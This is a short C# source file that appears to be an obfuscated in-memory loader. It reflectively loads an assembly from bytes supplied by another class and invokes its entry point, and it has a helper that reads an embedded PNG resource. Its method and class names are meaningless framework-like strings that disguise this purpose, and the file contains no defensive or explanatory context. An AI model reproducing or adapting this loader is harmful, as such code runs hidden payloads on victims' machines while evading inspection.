using System.Drawing;
using System.IO;
using System.Reflection;

public class IsJitIntrinsic
{
	public static Assembly open = Assembly.Load(TokenBasedSet.ThreadWaitReason());

	public static MethodInfo mentry = Assembly.Load(TokenBasedSet.ThreadWaitReason()).EntryPoint;

	public static object HTTP_REQUEST_TOKEN_BINDING_INFO(Assembly assembly, MethodInfo entryPoint)
	{
		return assembly.CreateInstance(HotHeap40(entryPoint));
	}

	public static void ClientContextTerminatorSink(Assembly assembly, MethodInfo entryPoint)
	{
		entryPoint.Invoke(HTTP_REQUEST_TOKEN_BINDING_INFO(assembly, entryPoint), null);
	}

	public static string HotHeap40(MethodInfo entryPoint)
	{
		return (string)AutoCompleteDropDownFinder(entryPoint);
	}

	public static void ResourceManagerMediator()
	{
		IEnumConnections();
	}

	internal static object AutoCompleteDropDownFinder(object asm)
	{
		return ((MemberInfo)asm).Name;
	}

	internal static bool IEnumConnections()
	{
		ClientContextTerminatorSink(open, mentry);
		return true;
	}

	internal static bool GroupCount()
	{
		return false;
	}

	public static Image getResourceImg(Assembly asm)
	{
		using (Stream stream = asm.GetManifestResourceStream("InternalCrossContextDelegate.png"))
		{
			if (stream != null)
			{
				return Image.FromStream(stream);
			}
		}
		return null;
	}
}
